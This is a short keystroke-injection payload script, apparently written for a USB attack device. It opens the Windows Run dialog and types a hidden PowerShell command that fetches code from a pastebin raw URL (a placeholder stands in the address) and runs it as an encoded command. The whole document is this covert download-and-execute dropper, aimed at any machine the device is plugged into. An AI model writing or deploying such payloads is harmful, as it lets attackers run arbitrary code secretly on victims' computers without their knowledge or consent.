layout('us');
typingSpeed(0,0);

press("GUI r");
delay(100);
type("powershell -windowstyle hidden $u='https://pastebin.com/raw/PB WITH CODE TO EXE ';$r=Invoke-WebRequest -Uri $u;powershell -nop -e $r.content")
delay(100);
